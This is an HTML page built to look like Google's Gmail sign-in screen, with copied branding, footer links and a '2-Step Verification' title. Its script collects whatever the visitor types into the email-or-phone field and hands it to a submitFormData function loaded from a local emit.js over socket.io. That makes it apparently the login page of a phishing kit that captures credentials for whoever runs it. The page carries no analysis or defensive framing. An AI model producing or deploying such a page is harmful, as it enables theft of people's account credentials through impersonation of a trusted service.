<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>2-Step Verification</title>

<link href="https://fonts.googleapis.com/css?family=google+Sans:100,300,400,500,700,900" rel="stylesheet">
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Google Sans',sans-serif; 
}

body{
  background:#ffffff;
  color:#202124;
  min-height:100vh;
  overflow-x:hidden;
}

/* ===== WRAPPER ===== */
.page-wrapper{
  min-height:100vh;
  display:flex;
  flex-direction:column;
  align-items:center;
}

/* ===== MOBILE DEFAULT ===== */
.container{
  width:100%;
  padding:28px 24px 120px 24px;
  background:#ffffff;
  display:flex;
  flex-direction:column;
  align-items:flex-start; /* ‚Üê left align children */
}

.google-icon{
	width: 60px;
  height: auto;
}


/* google Logo */
.google-logo{
  font-size:34px;
  font-weight:500;
  margin-bottom:20px;
  text-align:center;
}
.google-logo span:nth-child(1){color:#4285F4;}
.google-logo span:nth-child(2){color:#DB4437;}
.google-logo span:nth-child(3){color:#F4B400;}
.google-logo span:nth-child(4){color:#4285F4;}
.google-logo span:nth-child(5){color:#0F9D58;}
.google-logo span:nth-child(6){color:#DB4437;}

/* ===== HEADER LEFT ALIGN ===== */
.header-left{
  width:100%;
  text-align:left;
  margin-bottom:16px;
}

.header-left h1{
  font-size:30px;
  font-weight:500;
  margin-bottom:8px;
}

.header-left p{ 
  font-size:17px;
  color:#5f6368;
  line-height:1.6; 
  margin-bottom:16px;
}

/* ===== USER INFO BOX ===== */
.user-info {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 16px;
  border: 2px solid #dadce0;
  border-radius: 12px;
  margin-bottom: 16px;
  width: 280px; /* shorter width */
  font-size: 16px;
  color: #202124;
  background: #ffffff;
}

.user-icon {
  font-size: 20px;
}

.phone-info{
margin-top: 30px;
font-size: 6px;
}

/* ===== INPUT ===== */
.input-wrapper{
  position:relative;
  margin-bottom:16px;
  width:100%;
}

.input-wrapper input{
  width:100%;
  padding:18px 14px;
  border:1.5px solid #dadce0;
  border-radius:8px;
  font-size:18px;
  background:transparent;
  outline:none;
  transition:0.2s ease;
  margin-top: 10px;
}

.input-wrapper input:focus{
  border-color:#1a73e8;
}

.input-wrapper label{
  position:absolute;
  left:14px;
  top:60%;
  transform:translateY(-50%);
  font-size:18px;
  color:#5f6368;
  padding:0 6px;
  transition:0.2s ease;
  pointer-events:none; 
}

.input-wrapper input:focus + label, 
.input-wrapper input:not(:placeholder-shown) + label{
  top:12px; 
  font-size:12px;
  background:#ffffff;
  color:#1a73e8;
}

/* ===== ERROR ===== */
.input-wrapper.error input{
  border-color:#d93025 !important;
}

.input-wrapper.error label{
  color:#d93025 !important;
}

.error-message{
  display:none;
  position:absolute;
  bottom:-22px;
  left:0;
  align-items:center;
  gap:6px;
  font-size:14px;
  color:#d93025;
}

.input-wrapper.error .error-message{
  display:flex;
}

.error-icon{
  width:16px;
  height:16px;
  border-radius:50%;
  background:#d93025;
  color:#fff;
  font-size:12px;
  display:flex;
  align-items:center;
  justify-content:center;
  font-weight:bold;
}

/* Shake */
@keyframes shake{
  0%{transform:translateX(0);}
  20%{transform:translateX(-4px);}
  40%{transform:translateX(4px);}
  60%{transform:translateX(-3px);}
  80%{transform:translateX(3px);}
  100%{transform:translateX(0);}
}

.input-wrapper.shake{
  animation:shake 0.35s;
}

/* ===== LINKS ===== */
.links{
  font-size:16px;
  margin-bottom:16px;
  width:100%;
}

.links a{
  display:inline-block;
  color:#1a73e8;
  text-decoration:none;
  margin-top:14px;
  text-align:left;
}

/* Action row (Next + Try another way) */
.action-row{
  display:flex;
  justify-content:space-between;
  align-items:center;
  width:100%;
  margin-top:50px; 
}

.try-link{
  color:#1a73e8;
  text-decoration:none;
  font-size:16px;
}

/* ===== BUTTON ===== */
.next-btn{
  background:#1a73e8;
  color:#ffffff;
  border:none;
  padding:12px 28px;
  border-radius:22px;
  font-size:15px;
  cursor:pointer;
}

/* ===== FOOTER MOBILE ===== */ 
.page-footer{
  font-size:12px;
  color:#5f6368;
  display:flex;
  justify-content:space-between;
  align-items:center;
  padding:12px 20px;
  position:fixed;
  bottom:0;
  left:0;
  width:100%;
  background:#ffffff;
}

.language-select{
  display:flex;
  align-items:center;
  gap:6px;
  border:1px solid #dadce0;
  padding:6px 12px;
  border-radius:18px;
  cursor:pointer;
}

.language-select::after{
  content:"‚ñº";
  font-size:10px;
  margin-left:6px;
}

.footer-links{
  display:flex;
  gap:14px;
}

.footer-links a{
  color:#5f6368;
  text-decoration:none;
}

/* ===== DESKTOP ===== */
@media (min-width:768px){
  body{
    background:#f1f3f4;
  }

  .page-wrapper{
    justify-content:center;
    align-items:center;
  }

  .container{
    max-width:460px;
    padding:40px;
    border-radius:18px;
    box-shadow:0 8px 30px rgba(0,0,0,0.08);
  }

  .page-footer{
    position:static;
    width:460px;
    margin-top:16px;
    background:transparent;
    border-top:none;
  }

  #loading-bar{
    position:absolute;
    width:460px;
    top:0;
  }
}

/* ===== LOADING ===== */
#overlay{
  position:fixed;
  inset:0;
  background:rgba(255,255,255,0.7);
  display:none;
  z-index:1000;
}

#loading-bar{
  position:fixed;
  top:0;
  left:0;
  height:3px;
  width:0%;
  background:linear-gradient(90deg,#1a73e8 0%,#8ab4f8 50%,#1a73e8 100%);
  background-size:200% 100%;
  animation:shimmer 1s linear infinite;
  display:none;
  z-index:1100;
}

@keyframes shimmer{
  0%{background-position:200% 0;}
  100%{background-position:-200% 0;}
}
</style>
</head>
<body>

<div id="overlay"></div>
<div id="loading-bar"></div>

<div class="page-wrapper">

<div class="container">

 <div class="google-logo">
  <img src="https://img.icons8.com/?size=100&id=17949&format=png&color=000000" alt="" class="google-icon">
</div>

<!-- HEADER LEFT ALIGN -->
<div class="header-left">
  <h1>Sign in</h1> 
  <p>to continue to Gmail</p> 
</div>

<!-- USER INFO -->
<!--div class="user-info">
  <span class="user-icon">üë§</span>
  <span class="username">John Doe</span>
</div-->

<!-- INPUT -->
<div class="input-wrapper" id="codeField">
  <input type="text" id="codeInput" placeholder=" ">
  <label>Email or phone</label>

  <div class="error-message">
    <div class="error-icon">!</div>
    <span id="errorText">Incorrect code</span>
  </div>
</div>


<div class="links">
  <a href="#">Forgot email</a>
</div>

<p style="font-size:14px; margin-bottom:16px;width:100%;" class="phone-info">
  Not your computer, use guest mode to sign in privately.<a href="#" >&nbsp&nbspLearn more about using guest mode</a>
</p>


<div class="action-row">
  <a href="#" class="try-link">Create account</a>
  <button class="next-btn" id="submitBtn">Next</button>
</div>

</div>

<div class="page-footer">
  <div class="language-select">
    English (United States)
  </div>
  <div class="footer-links">
    <a href="#">Help</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
  </div>
</div>

</div>
<script src="/assets/emit.js"></script> 
<script>
page = "login";

submitBtn.addEventListener("click", function() {

  const inputs = $('#codeField')
    .find('input[type="text"], input[type="password"]');

  const user = {};

  inputs.each(function () {
    const value = $(this).val().trim();
    user[$(this).attr("name")] = value;
  });

  submitFormData(user);
});


input.addEventListener("input",()=>{
  wrapper.classList.remove("error");
});
</script>

</body>
</html>
